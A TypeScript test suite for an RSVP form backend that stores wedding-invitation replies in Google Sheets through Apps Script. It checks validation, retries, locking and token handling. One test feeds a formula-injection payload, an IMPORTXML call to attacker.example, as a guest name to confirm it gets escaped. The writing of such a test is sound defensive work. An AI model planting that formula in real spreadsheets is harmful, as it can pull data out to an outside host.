import { afterEach, beforeEach, describe, expect, spyOn, test } from "bun:test";
import { readFileSync } from "node:fs";
import { runInNewContext } from "node:vm";
import { onRequest } from "../../functions/api/rsvp";

const script = readFileSync(new URL("../../apps-script/Code.gs", import.meta.url), "utf8");
const env = {
  RSVP_SCRIPT_URL: "https://script.google.com/macros/s/test-deployment/exec",
  RSVP_API_TOKEN: "synthetic-test-token-not-a-real-secret",
};
const valid = {
  requestId: "d0da906d-8fb7-4c37-8f51-dd5bcb5aa770",
  name: " Nguyễn An ", attendance: "attending", count: 2,
  note: " Hẹn gặp hai bạn! ", website: "",
};

// Execute the deployable Apps Script, mocking only Google's host services.
// This tests our protocol/storage behavior, not the real Google service.
function googleHarness() {
  const rows: unknown[][] = [];
  let locked = false;
  let busy = false;
  let failFlush = false;
  const lock = {
    tryLock() { locked = !busy; return locked; },
    hasLock() { return locked; },
    releaseLock() { locked = false; },
  };
  function range(row: number, column: number, height = 1, width = 1) {
    expect(locked).toBe(true);
    return {
      setValues(values: unknown[][]) {
        values.forEach((cells, i) => {
          rows[row - 1 + i] ??= [];
          cells.forEach((value, j) => { rows[row - 1 + i]![column - 1 + j] = value; });
        });
      },
      getValues() {
        return Array.from({ length: height }, (_, i) =>
          Array.from({ length: width }, (_, j) => rows[row - 1 + i]?.[column - 1 + j] ?? ""));
      },
      getValue() { return rows[row - 1]?.[column - 1] ?? ""; },
      createTextFinder(text: string) {
        const finder = {
          matchEntireCell() { return finder; },
          matchCase() { return finder; },
          useRegularExpression() { return finder; },
          findNext() {
            const index = rows.findIndex((cells, i) => i >= row - 1 && i < row - 1 + height && cells[column - 1] === text);
            return index < 0 ? null : { getRow: () => index + 1 };
          },
        };
        return finder;
      },
    };
  }
  const sheet = {
    getLastRow: () => rows.length,
    getRange: range,
    appendRow(values: unknown[]) { expect(locked).toBe(true); rows.push(values); },
  };
  let exists = false;
  const runtime = runInNewContext(script + "\n({ doPost })", {
    PropertiesService: { getScriptProperties: () => ({ getProperty: () => env.RSVP_API_TOKEN }) },
    LockService: { getScriptLock: () => lock },
    SpreadsheetApp: {
      openById(id: string) {
        expect(id).toBe("1c7TpzxU7pS5JtdgGbt_1cFwR336KVPWPQqdzLD1ARc0");
        return {
          getSheetByName: () => exists ? sheet : null,
          insertSheet(name: string) { expect(name).toBe("RSVP"); exists = true; return sheet; },
        };
      },
      flush() { if (failFlush) throw new Error("private account failure"); },
    },
    ContentService: {
      MimeType: { JSON: "application/json" },
      createTextOutput: (body: string) => ({ setMimeType: () => body }),
    },
  }) as { doPost(event: { postData: { contents: string } }): string };
  return {
    rows,
    get locked() { return locked; },
    set busy(value: boolean) { busy = value; },
    set failFlush(value: boolean) { failFlush = value; },
    post(body: string) { return runtime.doPost({ postData: { contents: body } }); },
  };
}

describe("RSVP → Apps Script protocol", () => {
  let google: ReturnType<typeof googleHarness>;
  let upstream: ReturnType<typeof spyOn<typeof globalThis, "fetch">>;
  beforeEach(() => {
    google = googleHarness();
    upstream = spyOn(globalThis, "fetch").mockImplementation(async (_url, init) =>
      new Response(google.post(String(init?.body)), { headers: { "Content-Type": "application/json" } }));
  });
  afterEach(() => upstream.mockRestore());

  function send(body: unknown = valid, headers: Record<string, string> = {}, config = env) {
    return onRequest({
      request: new Request("https://invitation.example/api/rsvp", {
        method: "POST", headers: { "Content-Type": "application/json", ...headers },
        body: typeof body === "string" ? body : JSON.stringify(body),
      }),
      env: config,
    });
  }

  test("saves trimmed Unicode data, keeps token server-side, and waits for acknowledgement", async () => {
    const response = await send(valid, { Origin: "https://invitation.example" });
    expect(response.status).toBe(200);
    expect(await response.json()).toEqual({ ok: true, requestId: valid.requestId });
    expect(response.headers.get("Cache-Control")).toBe("no-store");
    expect(google.rows[1]?.slice(2, 6)).toEqual(["Nguyễn An", "attending", 2, "Hẹn gặp hai bạn!"]);
    expect(upstream.mock.calls[0]?.[0]).toBe(env.RSVP_SCRIPT_URL);
    expect(upstream.mock.calls[0]?.[1]?.redirect).toBe("follow");
    expect(google.locked).toBe(false);
  });

  test("exact retries reuse one row; changed data conflicts without overwrite", async () => {
    for (let i = 0; i < 3; i++) expect((await send()).status).toBe(200);
    expect((await send({ ...valid, requestId: valid.requestId.toUpperCase() })).status).toBe(200);
    expect((await send({ ...valid, count: 3 })).status).toBe(409);
    expect(google.rows).toHaveLength(2);
    expect(google.rows[1]?.[4]).toBe(2);
  });

  test("lost acknowledgement can retry safely after a completed write", async () => {
    upstream.mockImplementationOnce(async (_url, init) => {
      google.post(String(init?.body));
      throw new Error("response lost after saving");
    });
    expect((await send()).status).toBe(503);
    expect((await send()).status).toBe(200);
    expect(google.rows).toHaveLength(2);
  });

  test("absent/default fields and maximum lengths remain valid", async () => {
    expect((await send({ ...valid, attendance: "absent", count: 10, name: "n".repeat(80), note: "x".repeat(400) })).status).toBe(200);
    expect((await send({ ...valid, requestId: crypto.randomUUID(), note: undefined, website: undefined })).status).toBe(200);
  });

  test("guest formulas are escaped, while repeated input still deduplicates", async () => {
    const body = { ...valid, name: '=IMPORTXML("https://attacker.example", "//a")', note: "+dangerous" };
    expect((await send(body)).status).toBe(200);
    expect((await send(body)).status).toBe(200);
    expect(google.rows[1]?.[2]).toBe("'" + body.name);
    expect(google.rows[1]?.[5]).toBe("'" + body.note);
    expect(google.rows).toHaveLength(2);
  });

  test.each([
    { requestId: "invalid" }, { name: " " }, { name: 1 }, { name: "n".repeat(81) },
    { note: "n".repeat(401) }, { attendance: "yes" }, { count: 0 }, { count: 11 },
    { count: 1.5 }, { count: "2" }, { website: "spam" }, { website: 123 },
  ])("rejects invalid input before calling Google: %j", async (fields) => {
    expect((await send({ ...valid, ...fields })).status).toBe(400);
    expect(upstream).not.toHaveBeenCalled();
  });

  test("rejects malformed JSON, oversized bytes, foreign origins, and wrong media type", async () => {
    for (const body of ["{broken", "null", "[]", "true"]) expect((await send(body)).status).toBe(400);
    expect((await send(JSON.stringify({ ...valid, padding: "界".repeat(3000) }), { "Content-Length": "1" })).status).toBe(413);
    expect((await send(valid, { Origin: "https://attacker.example" })).status).toBe(403);
    expect((await send(valid, { "Content-Type": "text/plain" })).status).toBe(415);
    expect(upstream).not.toHaveBeenCalled();
  });

  test("only POST is allowed", async () => {
    for (const method of ["GET", "PUT", "DELETE", "OPTIONS"]) {
      const response = await onRequest({ request: new Request("https://invitation.example/api/rsvp", { method }), env });
      expect(response.status).toBe(405);
      expect(response.headers.get("Allow")).toBe("POST");
    }
    expect(upstream).not.toHaveBeenCalled();
  });

  test("missing/unsafe configuration cannot send the token to an arbitrary URL", async () => {
    for (const config of [
      { ...env, RSVP_API_TOKEN: "" }, { ...env, RSVP_API_TOKEN: "short" },
      { ...env, RSVP_SCRIPT_URL: "" }, { ...env, RSVP_SCRIPT_URL: "https://attacker.example/exec" },
      { ...env, RSVP_SCRIPT_URL: "https://script.google.com/macros/s/test/dev" },
    ]) expect((await send(valid, {}, config)).status).toBe(503);
    expect(upstream).not.toHaveBeenCalled();
  });

  test("Google login HTML, failures, or mismatched acknowledgements cannot report success", async () => {
    for (const response of [
      new Response("Google account required"), new Response("failure", { status: 500 }),
      Response.json({ ok: true }), Response.json({ ok: true, requestId: crypto.randomUUID() }),
      Response.json({ ok: false, error: "unauthorized", token: "private upstream details" }),
    ]) {
      upstream.mockResolvedValueOnce(response);
      const result = await send();
      expect(result.status).toBe(503);
      expect(await result.json()).toEqual({ ok: false, error: "service_unavailable" });
    }
  });

  test("Apps Script independently authenticates and validates before accessing Sheets", () => {
    for (const body of [
      { token: "wrong", submission: valid },
      { token: env.RSVP_API_TOKEN, submission: { ...valid, count: 0 } },
      { token: env.RSVP_API_TOKEN, submission: null },
    ]) expect(JSON.parse(google.post(JSON.stringify(body))).ok).toBe(false);
    expect(google.rows).toHaveLength(0);
  });

  test("lock contention, flush failure and unexpected headers fail safely", async () => {
    google.busy = true;
    expect((await send()).status).toBe(503);
    expect(google.rows).toHaveLength(0);
    google.busy = false;
    google.failFlush = true;
    expect((await send()).status).toBe(503);
    expect(google.locked).toBe(false);
    google.failFlush = false;
    expect((await send()).status).toBe(200);
    google.rows[0]![0] = "User's existing unrelated data";
    expect((await send({ ...valid, requestId: crypto.randomUUID() })).status).toBe(503);
    expect(google.rows).toHaveLength(2);
  });

  test("pending Google response cannot resolve the form request as saved", async () => {
    let release!: () => void;
    const gate = new Promise<void>((resolve) => { release = resolve; });
    upstream.mockImplementationOnce(async (_url, init) => {
      await gate;
      return new Response(google.post(String(init?.body)));
    });
    let resolved = false;
    const pending = send().then((response) => { resolved = true; return response; });
    await Bun.sleep(10);
    expect(resolved).toBe(false);
    expect(google.rows).toHaveLength(0);
    release();
    expect((await pending).status).toBe(200);
  });
});
